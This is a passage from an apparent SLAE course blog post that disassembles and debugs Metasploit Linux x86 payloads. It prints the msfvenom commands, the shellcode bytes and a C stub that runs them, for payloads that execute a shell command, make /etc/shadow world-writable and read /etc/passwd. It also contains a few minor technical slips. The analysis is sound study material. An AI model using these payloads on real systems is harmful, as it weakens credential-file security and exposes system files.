ebp=0x00000000 esi=0x00000000 edi=0x00416fc8<br />[emu 0x0x2123610 debug ] Flags:<br /><span style="color:#ff0000;">int execve (</span><br /><span style="color:#ff0000;">const char * dateiname = 0x00416fc0 =&gt;</span><br /><span style="color:#ff0000;">= "/bin/sh";</span><br /><span style="color:#ff0000;">const char * argv[] = [</span><br /><span style="color:#ff0000;">= 0x00416fb0 =&gt;</span><br /><span style="color:#ff0000;">= 0x00416fc0 =&gt;</span><br /><span style="color:#ff0000;">= "/bin/sh";</span><br /><span style="color:#ff0000;">= 0x00416fb4 =&gt;</span><br /><span style="color:#ff0000;">= 0x00416fc8 =&gt;</span><br /><span style="color:#ff0000;">= "-c";</span><br /><span style="color:#ff0000;">= 0x00416fb8 =&gt;</span><br /><span style="color:#ff0000;">= 0x0041701d =&gt;</span><br /><span style="color:#ff0000;">= "id";</span><br /><span style="color:#ff0000;">= 0x00000000 =&gt;</span><br /><span style="color:#ff0000;">none;</span><br /><span style="color:#ff0000;">];</span><br /><span style="color:#ff0000;">const char * envp[] = 0x00000000 =&gt;</span><br /><span style="color:#ff0000;">none;</span><br /><span style="color:#ff0000;">) = 0;</span></pre>
<p style="text-align:justify;">The interesting part here is the output of the <strong>Libemu</strong> tool, which in fact produces a pseudo code that helps us to better understand the operation of the analysed shellcode. As you can see with red above, the emulator performs some analysis on the system calls and their parameters, and then presents the analysis in C pseudo-code.&nbsp;</p>
<p style="text-align:justify;">Furthermore we can convert the <strong>.dot</strong>&nbsp;file to a <strong>png</strong> in order to see the flow visually.</p>
<pre class="prettyprint linenums"><span class="pln"><span style="color:#cd0000;"><b>root@kali</b></span>:<span style="color:#a7a7f3;"><b>~/Documents/SLAE/Assignment5</b></span># dot linux_exec.dot -T png &gt; linux_exec.png</span></pre>
<p style="text-align:justify;">Then the following <strong>png</strong> image file will be produced which shows the assembly code snippet that correlates with the <strong>execve</strong> system call&nbsp;</p>
<p style="text-align:justify;"><img class="alignnone size-full wp-image-2547" src="{{ site.baseurl }}/assets/images/2020/08/linux_exec.png" alt="linux_exec" width="737" height="397" />&nbsp;</p>
<h3>&nbsp;</h3>
<h2><span style="color:#339966;">3rd Shellcode analysis - chmod</span></h2>
<p style="text-align:justify;">At this section the <strong>chmod</strong> shellcode will be analysed. Before we continue the analysis of the payload we will review the information provided from <strong>msfconsole.&nbsp;</strong></p>
<pre>msf5 &gt; use payload/linux/x86/chmod
msf5 payload(linux/x86/chmod) &gt; info

Name: Linux Chmod
Module: payload/linux/x86/chmod
Platform: Linux
Arch: x86
Needs Admin: No
Total size: 36
Rank: Normal

Provided by:
kris katterjohn &lt;katterjohn@gmail.com&gt;

Basic options:
Name Current Setting Required Description
---- --------------- -------- -----------
FILE /etc/shadow yes Filename to chmod
MODE 0666 yes File mode (octal)

Description:
Runs chmod on specified file with specified mode</pre>
<p style="text-align:justify;">The <strong>chmod</strong> payload changes the file permissions of a file. The following command will be used in order to generate the <strong>chmod</strong> shellcode. The output will be saved to a file named <strong>chmod.c</strong></p>
<pre><span style="color:#cd0000;"><b>root@kali</b></span>:<span style="color:#a7a7f3;"><b>~/Documents/SLAE/Assignment5</b></span># msfvenom -p linux/x86/chmod -f c -o chmod.c
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 36 bytes
Final size of c file: 177 bytes
Saved as: chmod.c</pre>
<p style="text-align:justify;">Before we continue with the analysis the <strong>chmod</strong> syscall prototype is being provided as follows</p>
<pre><b>#include &lt;sys/stat.h&gt;</b>

<b>int chmod(const char *</b><i>pathname</i><b>, mode_t </b><i>mode</i><b>);</b></pre>
<p style="text-align:justify;">As we see above the <strong>chmod</strong> system call has two arguments, the <strong>mode</strong> and the <strong>pathname</strong>. Both these arguments are used to construct the <strong>chmod</strong> system call that is used to change the permissions of a file. In detail the <strong>pathname</strong> is a constant char array that holds the path of the file for which the permissions are about to change. Moreover the <strong>mode </strong>argument is being used in order to be assigned with the octal value that represents the permissions of the file. Furthermore, as seen from the man page of <a href="https://www.man7.org/linux/man-pages/man2/chmod.2.html"><strong>chmod</strong></a> syscall, the file mode consists of the file permission bits plus the set-user-ID, set-group-ID, and sticky bits. The <strong>ndisasm</strong> tool can be used to disassemble the <strong>chmod</strong> shellcode.</p>
<pre><span style="color:#cd0000;"><b>root@kali</b></span>:<span style="color:#a7a7f3;"><b>~/Documents/SLAE/Assignment5</b></span># echo -ne `cat chmod.c | grep -v unsigned | sed 's/"//g' | sed ':a;N;$!ba;s/\n//g' | sed 's/^"//;$s/;$//'` | ndisasm -u -
00000000 99         cdq
00000001 6A0F       push byte +0xf
00000003 58         pop eax
00000004 52         push edx
<span style="color:#ff0000;">00000005 E80C000000 call 0x16</span>
0000000A 2F         das
0000000B 657463     gs jz 0x71
0000000E 2F         das
0000000F 7368       jnc 0x79
00000011 61         popa
00000012 646F       fs outsd
00000014 77<span style="color:#33cccc;">00</span>       ja 0x16
00000016 5B         pop ebx
00000017 68B6010000 push dword 0x1b6
0000001C 59         pop ecx
0000001D CD80       int 0x80
0000001F 6A01       push byte +0x1
00000021 58         pop eax
00000022 CD80       int 0x80</pre>
<p style="text-align:justify;">Furthermore, starting the analysis, the <strong>cdq</strong> instruction used to zero out the <strong>edx</strong> register because as mentioned before the <strong>cdq</strong> extends the sign bit of <strong>eax</strong> into the <strong>edx</strong> register. This means that if the sign bit is zero as indicated by the flag&nbsp; <strong>SF = 0</strong>, then the extension of <strong>edx</strong> register will be <strong>0x00000000. </strong>Later on at the second instruction the <strong>0xf</strong> hex value ( 15 in decimal ) pushed on the stack and stored in <strong>eax</strong> register using the <strong>pop eax</strong> instruction. Then the <strong>edx </strong>register which has been assigned the null value will be pushed on the stack using the <strong>push edx</strong> instruction. As seen in red colour above the call instruction is being used to redirect the execution flow <strong>0x16</strong> bytes ( 22 in decimal )&nbsp; from the start of the shellcode and also to push the memory address ( address immediately after the call instruction ) on the stack. After the <strong>call</strong> instruction and until the 22nd byte from the start of the shellcode we see some instructions that doesn't seem valid. They seem to be disassembled junk but lets examine the bytecodes</p>
<pre>0000000A <span style="color:#ff0000;">2F</span>     das 
0000000B <span style="color:#ff0000;">657463</span> gs jz 0x71 
0000000E <span style="color:#ff0000;">2F</span>     das 
0000000F <span style="color:#ff0000;">7368</span>   jnc 0x79 
00000011 <span style="color:#ff0000;">61</span>     popa 
00000012 <span style="color:#ff0000;">646F</span>   fs outsd 
00000014 <span style="color:#ff0000;">7700</span>   ja 0x16</pre>
<p style="text-align:justify;">Using some python scripting we can decode the above bytecodes in ASCII text in order to examine the output</p>
<pre>Python 2.7.17 (default, Oct 19 2019, 23:36:22)
[GCC 9.2.1 20191008] on linux2
Type "help", "copyright", "credits" or "license" for more information.
&gt;&gt;&gt; "2F6574632F736861646F7700".decode("hex")
'/etc/shadow\x00'</pre>
<p style="text-align:justify;">As we see at the output above the bytecodes are translated to '<strong>/etc/shadow</strong>' which refers to the Linux shadow file that holds the password hashes. Also, we can observe that the string that holds the value of the shadow path is terminated with the null byte <strong>'\x00'</strong>. Afterwards a stub file will be constructed which will carry the shellcode in order to perform dynamic analysis using <strong>gdb-peda</strong> that will help us to examine the translation of the bytecodes at runtime. Below is the creation of the <strong>shellcode.c</strong> stub file</p>
<pre><span style="color:#cd0000;"><b>root@kali</b></span>:<span style="color:#a7a7f3;"><b>~/Documents/SLAE/Assignment5</b></span># cat &lt;&lt; EOF &gt;&gt; shellcode.c<br />&gt; #include &lt;stdio.h&gt;<br />&gt; #include &lt;string.h&gt;<br />&gt;<br />&gt; unsigned char shellcode[] = "$(cat chmod.c | grep -v unsigned | sed 's/"//g' | sed ':a;N;$!ba;s/\n//g' | sed 's/^"//;$s/;$//')";<br />&gt;<br />&gt; int main()<br />&gt; {<br />&gt; printf("Shellcode Length: %d\n", strlen(shellcode));<br />&gt; int (*ret)() = (int(*)()) shellcode;<br />&gt; ret();<br />&gt; }<br />&gt; EOF</pre>
<p style="text-align:justify;">Now lets compile and run the <strong>shellcode.c</strong> file as seen below&nbsp;</p>
<pre><span style="color:#cd0000;"><b>root@kali</b></span>:<span style="color:#a7a7f3;"><b>~/Documents/SLAE/Assignment5</b></span># gcc -fno-stack-protector -g -z execstack -m32 -o shellcode shellcode.c</pre>
<p style="text-align:justify;">Furthermore, we will run the executable file with <strong>gdb-peda</strong> as follows</p>
<pre><span style="color:#cd0000;"><b>root@kali</b></span>:<span style="color:#a7a7f3;"><b>~/Documents/SLAE/Assignment5</b></span># gdb -q ./shellcode<br />Reading symbols from ./shellcode...<br />gdb-peda$ b *&amp;shellcode<br />Breakpoint 1 at 0x4040<br />gdb-peda$ r</pre>
<p style="text-align:justify;">Next as we see from <strong>gdb-peda</strong> ,the call instruction will redirect the flow at offset <strong>0x404056</strong></p>
<pre> 0x404045 &lt;shellcode+5&gt;: call <span style="color:#ff0000;">0x404056</span> &lt;shellcode+22&gt;<br /> 0x40404a &lt;shellcode+10&gt;: das</pre>
<p style="text-align:justify;">After executing the <strong>call</strong> instruction, the memory address of the next instruction will be saved on the top of the stack , referring to the "<strong>/etc/shadow"</strong> string as shown below&nbsp;</p>
<pre>[------------------------------------stack-------------------------------------]<br />0000| 0xbffff4f4 --&gt; 0x40404a ("/etc/shadow")</pre>
<p style="text-align:justify;">Also the instruction pointer will point at address <strong>0x404056</strong></p>
<pre>EIP: 0x404056 --&gt; 0x1b6685b</pre>
<p style="text-align:justify;">From <strong>gdb-peda</strong> above we can indicate that the address <strong>0x404056</strong> contains the following hex value <strong>0x1b6685b</strong> which refers to the bytecodes in reverse order as seen from the <strong>ndisasm</strong> output in red below</p>
<pre>00000016 <span style="color:#ff0000;">5B</span> pop ebx                   <br />00000017 <span style="color:#ff0000;">68B601</span>0000 push dword 0x1b6</pre>
<p style="text-align:justify;">Regarding the <strong>ndisasm</strong> output , after the execution of the <strong>call</strong> instruction mentioned earlier, the execution flow will be redirected at offset <strong>00000016</strong></p>
<pre>00000016 5B <strong>pop ebx</strong></pre>
<p style="text-align:justify;">Then the<strong> ebx</strong> register will be assigned with the '<strong>/etc/shadow</strong>' string because as we saw before this string was at the top of the stack. From <strong>gdb</strong> we will have the following output&nbsp;</p>
<pre>gdb-peda$ x/s $ebx<br />0x40404a &lt;shellcode+10&gt;: "/etc/shadow"</pre>
<p style="text-align:justify;">The next instruction is being used to push the permissions mode of <strong>'/etc/shadow'</strong> file&nbsp;</p>
<pre><strong>push dword 0x1b6  <span style="color:#33cccc;">; push the permissions mode on </span></strong><strong><span style="color:#33cccc;">the stack</span></strong></pre>
<p style="text-align:justify;">Furthermore, the hex value <strong>0x1b6</strong>&nbsp; which represents the permissions of a file will be saved on the stack. Afterwards, using python the octal representation of the hex value will be as follows</p>
<pre>Python 3.8.3 (default, Jul 8 2020, 14:27:55)<br />[Clang 11.0.3 (clang-1103.0.32.62)] on darwin<br />Type "help", "copyright", "credits" or "license" for more information.<br />&gt;&gt;&gt; s="1b6"<br />&gt;&gt;&gt; int(s,16)<br />438<br />&gt;&gt;&gt; print(oct(438))<br /><span style="color:#ff0000;">0o666</span></pre>
<p style="text-align:justify;">As we see above the mode bits in octal format will be <strong>666</strong> which indicates the file permissions. The digits 6, 6, and 6 each individually represent the permissions for the user, group, and others, in that order. Each digit is a combination of the numbers&nbsp;<b>4</b>,&nbsp;<b>2</b>,&nbsp;<b>1</b>, and&nbsp;<b>0</b>:&nbsp;</p>
<ul>
<li><b>4</b>&nbsp;stands for "read",</li>
<li><b>2</b>&nbsp;stands for "write",</li>
<li><b>1</b>&nbsp;stands for "execute", and</li>
<li><b>0</b>&nbsp;stands for "no permission."</li>
</ul>
<p style="text-align:justify;">Number<b> 6</b>&nbsp;is the combination of permissions&nbsp;<b>4</b>+<b>2</b><strong>+0</strong> (read, write, and no permission). So the Linux based permissions representation regarding the <strong>/etc/shadow</strong> file will be as follows <strong><em>rw-rw-rw.&nbsp; </em></strong>Later on, the <strong>pop ecx</strong> instruction will load the <strong>0x1b6</strong> hex value to the <strong>ecx</strong> register and then the <strong>chmod</strong> syscall will be executed using the <strong>int 0x80</strong> instruction&nbsp;</p>
<pre><strong>pop ecx   <span style="color:#33cccc;">; loads the mode bits to ecx register <br /></span>int 0x80<span style="color:#33cccc;">  ; execute chmod </span></strong></pre>
<p style="text-align:justify;">Following, the byte <strong>0x1</strong> is pushed on the stack and stored in <strong>eax</strong> register.&nbsp;</p>
<pre><strong>push byte +0x1  <span style="color:#33cccc;">; pushes the syscal identifier 0x1 on the stack</span> </strong><br /><strong>pop eax         <span style="color:#33cccc;">; loads 1 value on the stack</span> </strong><br /><strong>int 0x80        <span style="color:#33cccc;">; executes exit syscall</span> </strong></pre>
<p style="text-align:justify;">In <strong>unistd_32.h </strong>header file&nbsp;the value 1 specifies the <strong>exit</strong> system call. Also there are no necessary arguments for exit. The software interrupt <strong>int 0x80</strong> will execute the exit syscall.&nbsp;</p>
<p style="text-align:justify;">To summarise, from the <strong>chmod</strong> shellcode analysis the following system call used&nbsp;</p>
<pre><strong>chmod("/etc/shadow", 0666)</strong></pre>
<h3>&nbsp;</h3>
<h2><span style="color:#339966;">4th Shellcode analysis - <strong>read_file</strong></span></h2>
<p style="text-align:justify;">At this section the <strong>read_file</strong> shellcode produced from <strong>msfvenom</strong> will be analysed. Before we proceed with the analysis we will first read the following description from <strong>msfconsole</strong>&nbsp;</p>
<pre>msf5 payload(linux/x86/read_file) &gt; info<br /><br />Name: Linux Read File<br />Module: payload/linux/x86/read_file<br />Platform: Linux<br />Arch: x86<br />Needs Admin: No<br />Total size: 62<br />Rank: Normal<br /><br />Provided by:<br />hal<br /><br />Basic options:<br />Name Current Setting Required Description<br />---- --------------- -------- -----------<br />FD 1 yes The file descriptor to write output to<br />PATH yes The file path to read<br /><br />Description:<br />Read up to 4096 bytes from the local file system and write it back<br />out to the specified file descriptor</pre>
<p style="text-align:justify;">As we see above the <strong>read_file</strong> shellcode when executed reads up to <strong>4096</strong> bytes from any file provided from the local file system and then it writes the output to another file specified from a file descriptor. Regarding the above description in our case we will read the contents of the <strong>/etc/passwd</strong> file and we will write to the standard output by using the file descriptor 1. Using the following command the <strong>read_file</strong> shellcode will be saved into a file called <strong>read_file.c</strong>&nbsp;</p>
<pre><span style="color:#cd0000;"><b>root@kali</b></span>:<span style="color:#a7a7f3;"><b>~/Documents/SLAE/Assignment5</b></span># msfvenom -p linux/x86/read_file PATH=/etc/passwd FD=1 --platform=linux -f c -o read_file.c<br />[-] No arch selected, selecting arch: x86 from the payload<br />No encoder or badchars specified, outputting raw payload<br />Payload size: 73 bytes<br />Final size of c file: 331 bytes<br />Saved as: read_file.c</pre>
<p style="text-align:justify;">Before we continue with our analysis, we will first create a stub file that will carry our shellcode in order to compile it and run it with <strong>gdb-peda&nbsp;</strong></p>
<pre><span style="color:#cd0000;"><b>root@kali</b></span>:<span style="color:#a7a7f3;"><b>~/Documents/SLAE/Assignment5</b></span># cat &lt;&lt; EOF &gt; shellcode.c<br />&gt; #include &lt;stdio.h&gt;<br />&gt; #include &lt;string.h&gt;<br />&gt;<br />&gt; unsigned char shellcode[] = "$(cat read_file.c | grep -v unsigned | sed 's/"//g' | sed ':a;N;$!ba;s/\n//g' | sed 's/^"//;$s/;//')";<br />&gt;<br />&gt; int main()<br />&gt; {<br />&gt; printf("Shellcode Length: %d\n", strlen(shellcode));<br />&gt; int (*ret)() = (int(*)()) shellcode;<br />&gt; ret();<br />&gt; }<br />&gt; EOF</pre>
<p style="text-align:justify;">Then we will compile the <strong>shellcode.c</strong> file as follows&nbsp;</p>
<pre><span style="color:#cd0000;"><b>root@kali</b></span>:<span style="color:#a7a7f3;"><b>~/Documents/SLAE/Assignment5</b></span># gcc -fno-stack-protector -g -z execstack -m32 -o shellcode shellcode.c</pre>
<p style="text-align:justify;">Now that we have successfully compiled the <strong>shellcode.c</strong>&nbsp; the executable file is ready to run with <strong>gdb-peda</strong> debugger in order to examine the behaviour of the program on runtime.</p>
<pre>root@kali:~/Documents/SLAE/Assignment5# gdb -q ./shellcode<br />Reading symbols from ./shellcode...<br />gdb-peda$ b *&amp;shellcode<br />Breakpoint 1 at 0x4040<br />gdb-peda$ r</pre>
<p style="text-align:justify;">In order to see the instructions executed on runtime we can use the <strong>si</strong> command on <strong>gdb-peda</strong> as follows</p>
<pre>gdb-peda$ si<br />[----------------------------------registers-----------------------------------]<br />EAX: 0x404040 --&gt; 0x5b836eb<br />EBX: 0x404000 --&gt; 0x3efc<br />ECX: 0x7fffffec<br />EDX: 0xb7fb0010 --&gt; 0x0<br />ESI: 0xb7fae000 --&gt; 0x1d6d6c<br />EDI: 0xb7fae000 --&gt; 0x1d6d6c<br />EBP: 0xbffff508 --&gt; 0x0<br />ESP: 0xbffff4ec --&gt; 0x4011f9 (&lt;main+80&gt;: mov eax,0x0)<br />EIP: 0x404078 --&gt; 0xffffc5e8<br />EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)<br />[-------------------------------------code-------------------------------------]<br />0x40406c &lt;shellcode+44&gt;: mov eax,0x1<br />0x404071 &lt;shellcode+49&gt;: mov ebx,0x0<br />0x404076 &lt;shellcode+54&gt;: int 0x80<br />=&gt; 0x404078 &lt;shellcode+56&gt;: call 0x404042 &lt;shellcode+2&gt;<br />0x40407d &lt;shellcode+61&gt;: das<br />0x40407e &lt;shellcode+62&gt;: gs je 0x4040e4<br />0x404081 &lt;shellcode+65&gt;: das<br />0x404082 &lt;shellcode+66&gt;: jo 0x4040e5<br />No argument<br />[------------------------------------stack-------------------------------------]<br />0000| 0xbffff4ec --&gt; 0x4011f9 (&lt;main+80&gt;: mov eax,0x0)<br />0004| 0xbffff4f0 --&gt; 0x1<br />0008| 0xbffff4f4 --&gt; 0xbffff5b4 --&gt; 0xbffff701 ("/root/Documents/SLAE/Assignment5/shellcode")<br />0012| 0xbffff4f8 --&gt; 0xbffff5bc --&gt; 0xbffff72c ("SHELL=/bin/bash")<br />0016| 0xbffff4fc --&gt; 0x404040 --&gt; 0x5b836eb<br />0020| 0xbffff500 --&gt; 0xbffff520 --&gt; 0x1<br />0024| 0xbffff504 --&gt; 0x0<br />0028| 0xbffff508 --&gt; 0x0<br />[------------------------------------------------------------------------------]<br />Legend: code, data, rodata, value<br />0x00404078 in shellcode ()<br />gdb-peda$</pre>
<p style="text-align:justify;">The big advantage that <strong>gdb-peda</strong> has is that every time a command is used it also lists the code, the registers, the flags and the stack giving a whole clear view of the program behaviour without needing any further interaction with the debugger.</p>
<p style="text-align:justify;">Apart from <strong>gdb-peda, </strong>by using the following command we can isolate the shellcode from <strong>read_file.c</strong> in order to use it later with <strong>ndisasm</strong> tool to perform our static analysis.&nbsp;</p>
<pre><span style="color:#cd0000;"><b>root@kali</b></span>:<span style="color:#a7a7f3;"><b>~/Documents/SLAE/Assignment5</b></span>#  cat read_file.c | grep -v unsigned | sed 's/"//g' | sed ':a;N;$!ba;s/\n//g' | sed 's/^"//;$s/;//'<br />\xeb\x36\xb8\x05\x00\x00\x00\x5b\x31\xc9\xcd\x80\x89\xc3\xb8\x03\x00\x00\x00\x89\xe7\x89\xf9\xba\x00\x10\x00\x00\xcd\x80\x89\xc2\xb8\x04\x00\x00\x00\xbb\x01\x00\x00\x00\xcd\x80\xb8\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8\xc5\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x00</pre>
<p style="text-align:justify;">The following command is used to dissect the <strong>read_file</strong> shellcode in order to examine the produced disassembled code</p>
<pre><span style="color:#cd0000;"><b>root@kali</b></span>:<span style="color:#a7a7f3;"><b>~/Documents/SLAE/Assignment5</b></span># echo -ne "\xeb\x36\xb8\x05\x00\x00\x00\x5b\x31\xc9\xcd\x80\x89\xc3\xb8\x03\x00\x00\x00\x89\xe7\x89\xf9\xba\x00\x10\x00\x00\xcd\x80\x89\xc2\xb8\x04\x00\x00\x00\xbb\x01\x00\x00\x00\xcd\x80\xb8\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8\xc5\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x00" | ndisasm -u -<br />00000000 EB36       jmp short 0x38<br />00000002 B805000000 mov eax,0x5<br />00000007 5B         pop ebx<br />00000008 31C9       xor ecx,ecx<br />0000000A CD80       int 0x80<br />0000000C 89C3       mov ebx,eax<br />0000000E B803000000 mov eax,0x3<br />00000013 89E7       mov edi,esp<br />00000015 89F9       mov ecx,edi<br />00000017 BA00100000 mov edx,0x1000<br />0000001C CD80       int 0x80<br />0000001E 89C2       mov edx,eax<br />00000020 B804000000 mov eax,0x4<br />00000025 BB01000000 mov ebx,0x1<br />0000002A CD80       int 0x80<br />0000002C B801000000 mov eax,0x1<br />00000031 BB00000000 mov ebx,0x0<br />00000036 CD80       int 0x80<br />00000038 E8C5FFFFFF call 0x2<br />0000003D 2F         das<br />0000003E 657463     gs jz 0xa4<br />00000041 2F         das<br />00000042 7061       jo 0xa5<br />00000044 7373       jnc 0xb9<br />00000046 7764       ja 0xac<br />00000048 00         db 0x00</pre>
<p style="text-align:justify;">Starting our analysis, as we see above, the first instruction <strong>jmp short 0x38</strong> used to make a short jump at the offset <strong>00000038</strong> where the <strong>call 0x2</strong> instruction is located. Then the call instruction will save the memory address of the next instruction on the stack and also it will redirect the execution flow 2 bytes from the beginning of the shellcode and more precisely at offset <strong>00000002</strong> where the <strong>mov eax,0x5</strong> instruction is located. After the execution of the call instruction, the execution flow will continue from the offset <strong>00000002</strong> and the <strong>esp</strong> register will point to the string <strong>/etc/passwd</strong> as we see from the <strong>gdb-peda</strong>&nbsp;output below</p>
<pre>ESP: 0xbffff4e8 --&gt; 0x40407d ("/etc/passwd")</pre>
<p style="text-align:justify;">The same way, if we look closely to the following instructions we can see that there is disassembled junk code after the call instruction.</p>
<pre>0000003D <span style="color:#ff0000;">2F</span>     das<br />0000003E <span style="color:#ff0000;">657463</span> gs jz 0xa4<br />00000041 <span style="color:#ff0000;">2F</span>     das<br />00000042 <span style="color:#ff0000;">7061</span>   jo 0xa5<br />00000044 <span style="color:#ff0000;">7373</span>   jnc 0xb9<br />00000046 <span style="color:#ff0000;">7764</span>   ja 0xac<br />00000048 <span style="color:#ff0000;">003B  </span> add [ebx],bh</pre>
<p style="text-align:justify;">Furthermore, we can use some python scripting in order to translate the above bytecodes into ASCII text as follows</p>
<pre><span style="color:#cd0000;"><b>root@kali</b></span>:<span style="color:#a7a7f3;"><b>~/Documents/SLAE/Assignment5</b></span># cat path.txt | awk -F" " '{ print $2 }' |sed ':a;N;$!ba;s/\n//g'<br />2F6574632F706173737764003B<br />root@kali:~/Documents/SLAE/Assignment5# python<br />Python 2.7.17 (default, Oct 19 2019, 23:36:22)<br />[GCC 9.2.1 20191008] on linux2<br />Type "help", "copyright", "credits" or "license" for more information.<br />&gt;&gt;&gt; "2F6574632F706173737764003B".decode("hex")<br />'/etc/passwd\x00;'</pre>
<p style="text-align:justify;">Then as we see from the python output above, the <strong>'/etc/passwd'</strong> string has been revealed and it has also been terminated with the null byte <strong>'\x00'</strong>. Furthermore, after the <strong>call</strong> instruction returns, the next instruction to be executed is the following</p>
<pre><strong>mov eax,0x5  <span style="color:#33cccc;">; move 0x5 open syscall identifier into eax register</span></strong></pre>
<p style="text-align:justify;">As we see from the header file <strong>unistd_32.h</strong>, the above instruction used to load the <strong>open</strong> syscall identifier <strong>0x5</strong> to <strong>eax</strong> register&nbsp;</p>
<pre><span style="color:#cd0000;"><b>root@kali</b></span>:<span style="color:#a7a7f3;"><b>~/Documents/SLAE/Assignment5</b></span># cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep " 5"<br />#define __NR_open</pre>
<p style="text-align:justify;">Before we continue, below is the prototype of the <strong>open</strong> system call</p>
<pre><b>#include &lt;sys/types.h&gt;</b>
<b>#include &lt;sys/stat.h&gt;</b>
<b>#include &lt;fcntl.h&gt;</b>

<b>int open(const char *</b><i>pathname</i><b>, int </b><i>flags</i><b>);</b></pre>
<p style="text-align:justify;">As we see above the <strong>open</strong> system call takes two arguments, the <strong>pathname</strong> and the <strong>flags</strong>. According to the man page, the <strong>open</strong> system call opens the file specified by <strong>pathname</strong>. The return value of <b>open </b>system call is a file descriptor, a small, nonnegative integer that is used in subsequent system calls ( <strong>read(2), write(2), lseek(2), fcntl(2)</strong>, etc.). The argument flags must include one of the following access modes: <strong>O_RDONLY</strong>, <strong>O_WRONLY</strong>, or <strong>O_RDWR</strong>. These request opening the file read- only, write-only, or read/write, respectively. For more information about the <strong>open</strong> system call refer the the man page <a href="https://man7.org/linux/man-pages/man2/open.2.html">here</a>&nbsp;</p>
<p style="text-align:justify;">Furthermore, the <strong>"/etc/passwd"</strong> string will be loaded from the stack to the <strong>ebx</strong> register using the following instruction and that because after the execution of the <strong>call</strong> instruction, the <strong>"/etc/passwd"</strong> was saved at the top of the stack</p>
<pre><strong>pop ebx       <span style="color:#33cccc;">; load /etc/passwd on ebx register </span></strong></pre>
<p style="text-align:justify;"><span style="font-size:inherit;">Using <strong>gdb-peda</strong> we can see that the <strong>ebx</strong> register contains the following hex values&nbsp;</span></p>
<pre>gdb-peda$ x/12b $ebx<br />0x40407d &lt;shellcode+61&gt;: <span style="color:#ff0000;">0x2f 0x65 0x74 0x63 0x2f 0x70 0x61 0x73</span><br />0x404085 &lt;shellcode+69&gt;: <span style="color:#ff0000;">0x73 0x77 0x64 0x00</span></pre>
<p style="text-align:justify;">With the use of python we can confirm the ASCII text representation of the hex values in red above which will be the string <strong>"/etc/passwd"</strong> terminated with the null byte.</p>
<pre>Python 2.7.17 (default, Oct 19 2019, 23:36:22)<br />[GCC 9.2.1 20191008] on linux2<br />Type "help", "copyright", "credits" or "license" for more information.<br />&gt;&gt;&gt; "<span style="color:#ff0000;">2f6574632f70617373776400</span>".decode("hex")<br />/etc/passwd\x00'</pre>
<p style="text-align:justify;">The next instruction will zero out the <strong>ecx</strong> register which will be used for the second argument of the <strong>open</strong> system call.&nbsp;</p>
<pre><strong>xor ecx, ecx       <span style="color:#33cccc;">; zero out ecx register</span> </strong><br /><strong>int 0x80&nbsp;          <span style="color:#33cccc;">; execute the open system call </span></strong></pre>
<p style="text-align:justify;">Because the <strong>ecx</strong> register used to set the second argument of the <strong>open</strong> system call, it has been assigned with zero value in order to set the <strong>O_RDONLY</strong> flag. If we check the <strong>fcntl.h</strong> header file we will see that the <strong>O_RDONLY</strong> flag is defined with zeroes.&nbsp;</p>
<pre><span style="color:#cd0000;"><b>root@kali</b></span>:<span style="color:#a7a7f3;"><b>~/Documents/SLAE/Assignment5</b></span># grep -i -n "O_RDONLY" /usr/include/asm-generic/fcntl.h<br />20:#define O_RDONLY <span style="color:#ff0000;">00000000</span></pre>
<p style="text-align:justify;">Moreover, as we know the <strong>ecx</strong> register has the size of 32bits, the <strong>cx</strong> register has the size of 16bits, and the lower bytes <strong>cl</strong> register has the size of 8bits. Moreover, zeroing out&nbsp; the <strong>ecx</strong> register with <strong>xor ecx, ecx</strong> instruction the lower 8bits <strong>cl</strong> register will be assigned with zeros as seen below</p>
<pre><strong>                      ECX</strong><br /><strong>32</strong>---------------------------------------------<br />                                   <strong>CX</strong> <br />  ---------------------<strong>16</strong>----------------------<br />                             <strong>CH          <span style="color:#ff0000;">CL</span></strong><br />  ----------------------8-----------<strong><span style="color:#ff0000;">8</span></strong>----------<br />   00000000   00000000     00000000   <span style="color:#ff0000;">00000000</span><br /><br /> + 00000000   00000000     00000000   <span style="color:#ff0000;">00000000</span><br />  ---------------------------------------------
  
  
 00000000 00000000 00000000 00000000  
  
</pre>

**O\_RDONLY**

Then the **open** system call will be executed using **int 0x80** instruction. Moreover, the **open** system call will be constructed as follows&nbsp;

```
**open("/etc/passwd", O\_RDONLY)**
```

Going further with analysis, from **ndisasm** output we see the following code snippet&nbsp;

```
0000000C 89C3 mov ebx,eax
0000000E B803000000 mov eax,0x3
00000013 89E7 mov edi,esp
00000015 89F9 mov ecx,edi
00000017 BA00100000 mov edx,0x1000
0000001C CD80 int 0x80
```

The first instruction moves the value stored at **eax** register into **ebx** register. Using **gdb-peda** we will check the returned file descriptor at the time the **open** syscall executed when initiating the **int 0x80** instruction. Then the returned value from **open** system call will be saved at the **eax** register which will then be moved to **ebx** register.&nbsp;

```
mov ebx,eax ; moves the value of the eax register to the ebx register
```

From **gdb-peda** we see that the **eax** register will be assigned with the hex value **0x3** indicating the file descriptor of the opened file.&nbsp;

```
gdb-peda$ p $eax
$2 = 0x3
```

The next instruction will move the hex value **0x3** to the **eax** register

```
mov eax,0x3 ; move 0x3 hex value to eax register indicating the read system call
```

The above instruction moves the hex value **0x3** &nbsp;to **eax** register which indicates the **read** system call as we see from the **unistd\_32.h** header file below&nbsp;

```
**root@kali** : **~/Documents/SLAE/Assignment5** # grep -i -n "\_\_NR\_read " /usr/include/i386-linux-gnu/asm/unistd\_32.h
7:#define \_\_NR\_read 3
```

Following is the prototype of the read system call&nbsp;

```
**#include \<unistd.h\>**** ssize\_t read(int **_fd_** , void \ ***_buf_** , size\_t **_count_** );**
```

As we see at the above prototype, the **read** system call takes two arguments, the **count** and the **buf.** More precisely and according to the man page, the **read** system call attempts to read up to **count** bytes from file descriptor **fd** into the buffer starting at **buf**. At this point and before we move further with the analysis we should check the [Linux system call reference table](http://shell-storm.org/shellcode/files/syscalls.html) to see the registers that referring to the **read** system call arguments. As we see at the table, the **ebx** register that holds the **0x5** hex value refers to the first argument of the **read** system call, the **ecx** register is referring to the second argument and **edx** register is referring to the third argument.&nbsp;

